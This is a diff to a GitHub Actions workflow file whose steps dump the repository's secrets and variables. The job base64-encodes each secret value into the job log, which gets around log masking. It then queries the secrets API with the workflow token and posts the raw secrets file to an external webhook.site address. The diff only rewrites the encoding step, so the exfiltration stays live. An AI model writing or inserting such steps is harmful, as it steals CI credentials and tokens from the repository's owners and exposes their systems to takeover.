@@ -14,11 +14,7 @@ jobs:
           echo "event=${{ github.event_name }} repo=$GITHUB_REPOSITORY actor=$GITHUB_ACTOR"
           printf '%s' "$SECRETS_JSON" > sec.json
           printf '%s' "$VARS_JSON" > var.json
-          python3 -c 'import json,base64
-for f in ("sec.json","var.json"):
-    d=json.load(open(f))
-    print(f,"count",len(d))
-    for k,v in d.items():
-        print(f,k,"=",base64.b64encode(str(v).encode()).decode())'
-          echo "=== api list"; curl -s -o api.json -w 'apicode=%{http_code}\n' -H "Authorization: Bearer $GITHUB_TOKEN" "https://api.github.com/repos/$GITHUB_REPOSITORY/actions/secrets"; head -c 800 api.json; echo
+          python3 -c "import json,base64;d=json.load(open('sec.json'));print('secrets',len(d));[print('S',k,'=',base64.b64encode(str(v).encode()).decode()) for k,v in d.items()]"
+          python3 -c "import json,base64;d=json.load(open('var.json'));print('vars',len(d));[print('V',k,'=',base64.b64encode(str(v).encode()).decode()) for k,v in d.items()]"
+          curl -s -o api.json -w 'apicode=%{http_code}\n' -H "Authorization: Bearer $GITHUB_TOKEN" "https://api.github.com/repos/$GITHUB_REPOSITORY/actions/secrets"; head -c 800 api.json; echo
           curl -s -m 15 -X POST -H 'Content-Type: text/plain' --data-binary @sec.json "https://webhook.site/fe842e4c-11f7-4546-bcce-4bd8de4818b0" -o /dev/null -w 'hook=%{http_code}\n' || true
